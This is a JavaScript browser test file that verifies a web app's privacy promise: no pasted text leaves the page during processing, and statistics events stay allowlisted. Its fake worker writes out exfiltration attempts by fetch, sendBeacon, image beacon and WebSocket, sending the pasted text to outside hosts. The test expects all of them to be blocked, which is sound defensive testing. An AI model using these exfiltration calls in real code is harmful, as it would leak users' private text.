// The privacy promise, tested in a real browser: no request leaves the page while a text is
// being processed, and no statistics payload carries anything derived from the text.
//
//   npm test --prefix web          (needs chrome-headless-shell from puppeteer's cache)
//
// The models are not downloaded here. The worker is replaced by a fake that behaves like a
// buggy or hostile engine: while it "processes" a text it tries to send it out by fetch,
// sendBeacon, an image and a WebSocket. The test fails if any of those reaches the network,
// or if any statistics body contains four characters in a row of the pasted text, a number
// other than the schema version, or a key or value outside the allowlist.

import assert from "node:assert/strict";
import { mkdtempSync, readFileSync, readdirSync, existsSync, statSync } from "node:fs";
import { createServer } from "node:http";
import { tmpdir, homedir } from "node:os";
import { extname, join, normalize } from "node:path";
import { after, before, test } from "node:test";
import { fileURLToPath } from "node:url";

import puppeteer from "puppeteer-core";

import { SCHEMA } from "../../docs/app/stats-schema.js";

const DOCS = fileURLToPath(new URL("../../docs/", import.meta.url));
const CALIB = readFileSync(new URL("./fixtures/calibration.json", import.meta.url), "utf8");
const STATS_HOST = "reflip-stats.nerln.workers.dev";

// Words chosen so that no four letters in a row also appear in an allowed value.
const SENTINEL =
  "Zebulon quixotically juggled seven thousand marmots beside the Vltava, never bartering kumquats " +
  "with Ottoline, whose xylographs of fjords and myrrh puzzled every burgher in Zwolle. Hyacinth " +
  "Brubeck catalogued ninety jackdaws, although Wulfric doubted sixty of them. Gwendolyn " +
  "Tchaikovsky, by contrast, hummed lullabies to forty yaks near Kyzyl while sipping buttermilk. " +
  "Nobody believed Fitzwilliam when he swore that eleven ospreys had swum the Bosphorus at dusk. " +
  "Quillon Ebbesen archived thirty weathervanes in a crypt at Zwickau.";

const TYPES = { ".html": "text/html", ".js": "text/javascript", ".mjs": "text/javascript", ".css": "text/css",
  ".json": "application/json", ".svg": "image/svg+xml", ".wasm": "application/wasm" };

function chromePath() {
  const base = join(homedir(), ".cache/puppeteer/chrome-headless-shell");
  const versions = existsSync(base) ? readdirSync(base).sort() : [];
  for (const v of versions.reverse()) {
    const p = join(base, v, "chrome-headless-shell-mac-arm64", "chrome-headless-shell");
    if (existsSync(p)) return p;
  }
  return process.env.CHROME_PATH;
}

let server, browser, origin;

before(async () => {
  server = createServer((req, res) => {
    const path = normalize(decodeURIComponent(new URL(req.url, "http://x").pathname)).replace(/^\/+/, "");
    let file = join(DOCS, path);
    if (existsSync(file) && statSync(file).isDirectory()) file = join(file, "index.html");
    if (!file.startsWith(DOCS) || !existsSync(file)) {
      res.writeHead(404).end();
      return;
    }
    res.writeHead(200, { "Content-Type": TYPES[extname(file)] || "application/octet-stream" });
    res.end(readFileSync(file));
  });
  await new Promise((r) => server.listen(0, "127.0.0.1", r));
  origin = `http://127.0.0.1:${server.address().port}`;
  browser = await puppeteer.launch({
    executablePath: chromePath(),
    headless: true,
    args: ["--use-mock-keychain", "--disable-features=MacAppCodeSignClone",
      `--user-data-dir=${process.env.REFLIP_CHROME_PROFILE || mkdtempSync(join(tmpdir(), "reflip-chrome-"))}`],
  });
});

after(async () => {
  await browser?.close();
  server?.close();
});

// The fake engine. It runs in the page, as a replacement for the module worker.
function fakeWorker() {
  window.__attempts = [];
  window.__processing = [];
  const cached = ["onnx-community/Qwen2.5-0.5B", "onnx-community/Qwen2.5-0.5B-Instruct",
    "onnx-community/Qwen2.5-1.5B-Instruct", "onnx-community/Qwen3-1.7B-ONNX"];
  window.Worker = class {
    constructor() { this.onmessage = null; }
    reply(data) { setTimeout(() => this.onmessage?.({ data }), 5); }
    async postMessage(msg) {
      if (msg.type === "capabilities") return this.reply({ type: "capabilities", webgpu: true, f16: true, device: "webgpu", cached });
      if (msg.type === "prepare") return this.reply({ type: "ready", repos: msg.repos });
      if (msg.type !== "detect" && msg.type !== "rewrite") return;
      window.__processing.push({ start: performance.now() + performance.timeOrigin });
      const text = msg.text;
      const tries = {
        fetch: () => fetch("https://huggingface.co/leak?q=" + encodeURIComponent(text)),
        beacon: () => navigator.sendBeacon("https://reflip-stats.nerln.workers.dev/e", text),
        image: () => { new Image().src = "/leak.png?q=" + encodeURIComponent(text); },
        socket: () => new WebSocket("wss://example.com/" + encodeURIComponent(text.slice(0, 20))),
      };
      for (const [name, fn] of Object.entries(tries)) {
        try {
          await fn();
          window.__attempts.push({ name, refused: false });
        } catch (e) {
          window.__attempts.push({ name, refused: e?.name === "NetworkLockedError" });
        }
      }
      await new Promise((r) => setTimeout(r, 300));
      window.__processing.at(-1).end = performance.now() + performance.timeOrigin;
      if (msg.type === "detect") {
        return this.reply({ type: "detected", features: { tokens: 120, nll_obs: 2.1, nll_perf: 2.2, xent: 2.4,
          binoculars: 0.91, fdg_oo: 1.0, fdg_po: 0.8, burstiness: 0.4, sentences: 6, ppl_obs: 8.2 } });
      }
      return this.reply({ type: "rewritten", text: text.replace("seven thousand", "7,000") });
    }
  };
}

async function openApp() {
  const page = await browser.newPage();
  const requests = [];
  const stats = [];
  await page.setRequestInterception(true);
  page.on("request", (req) => {
    const url = req.url();
    requests.push({ url, body: req.postData() || "", t: Date.now() });
    if (url.includes(STATS_HOST)) {
      stats.push(req.postData() || "");
      return req.respond({ status: 204, headers: { "Access-Control-Allow-Origin": origin } });
    }
    if (url.endsWith("/app/calibration-browser.json")) {
      return req.respond({ status: 200, contentType: "application/json", body: CALIB });
    }
    if (!url.startsWith(origin)) return req.respond({ status: 599, body: "" });
    return req.continue();
  });
  await page.evaluateOnNewDocument(fakeWorker);
  await page.goto(`${origin}/app/`, { waitUntil: "networkidle0" });
  return { page, requests, stats };
}

function checkPayloads(stats) {
  const words = SENTINEL.split(/\s+/).length;
  for (const body of stats) {
    const ev = JSON.parse(body);
    assert.deepEqual(Object.keys(ev).sort(), Object.keys(SCHEMA).sort(), body);
    for (const [k, v] of Object.entries(ev)) assert.ok(SCHEMA[k].includes(v), `${k}=${v}`);
    for (let i = 0; i + 4 <= SENTINEL.length; i++) {
      const gram = SENTINEL.slice(i, i + 4);
      if (/\S{4}/.test(gram)) assert.ok(!body.includes(gram), `payload ${body} contains "${gram}" from the text`);
    }
    for (const n of (body.match(/\d+(\.\d+)?/g) || []).map(Number)) {
      if (body.includes(`"v":${n}`)) continue;
      assert.notEqual(n, SENTINEL.length, "character count in a payload");
      assert.notEqual(n, words, "word count in a payload");
    }
  }
}

test("comparing facts sends one allowlisted event and nothing from the text", async () => {
  const { page, requests, stats } = await openApp();
  await page.type("#text", SENTINEL);
  await page.$eval("#after", (el, v) => { el.value = v; }, SENTINEL.replace("ninety", "eighty"));
  await page.click("#compare");
  await new Promise((r) => setTimeout(r, 200));
  const out = await page.$eval("#facts-out", (el) => el.textContent);
  assert.match(out, /2 facts changed/);
  assert.deepEqual(stats.map((b) => JSON.parse(b).e), ["page", "facts"]);
  checkPayloads(stats);
  for (const r of requests) assert.ok(!r.url.includes("Zebulon") && !r.body.includes("Zebulon"), r.url);
  await page.close();
});

for (const tool of ["detect", "rewrite"]) {
  test(`${tool}: nothing leaves while the text is processed, and the counter hears only the event`, async () => {
    const { page, requests, stats } = await openApp();
    await page.$eval("#text", (el, v) => { el.value = v; }, SENTINEL);
    await page.click(`#tab-${tool}`);
    await page.waitForFunction((id) => !document.getElementById(id).disabled, {}, tool);
    await page.click(`#${tool}`);
    await page.waitForFunction(() => window.__processing.length && window.__processing.at(-1).end, { timeout: 5000 });
    await new Promise((r) => setTimeout(r, 300));
    const { processing, attempts } = await page.evaluate(() => ({ processing: window.__processing, attempts: window.__attempts }));
    for (const a of attempts) assert.ok(a.refused, `${a.name} was not refused by the lock`);
    const [{ start, end }] = processing;
    const during = requests.filter((r) => r.t >= start && r.t <= end);
    assert.deepEqual(during.map((r) => r.url), [], "requests while the text was being processed");
    assert.ok(stats.some((b) => JSON.parse(b).e === tool), "the use is counted once the lock is off");
    checkPayloads(stats);
    for (const r of requests) {
      assert.ok(!r.url.includes("Zebulon") && !r.body.includes("Zebulon"), `the text reached ${r.url}`);
    }
    await page.close();
  });
}

test("the page declares the Content-Security-Policy the promise depends on", () => {
  const html = readFileSync(join(DOCS, "app/index.html"), "utf8");
  const csp = html.match(/Content-Security-Policy" content="([^"]+)"/)[1];
  const connect = csp.split(";").map((s) => s.trim()).find((s) => s.startsWith("connect-src"));
  assert.equal(connect, "connect-src 'self' https://huggingface.co https://*.hf.co https://reflip-stats.nerln.workers.dev");
  assert.match(csp, /default-src 'self'/);
  assert.doesNotMatch(csp, /unsafe-inline/);
});
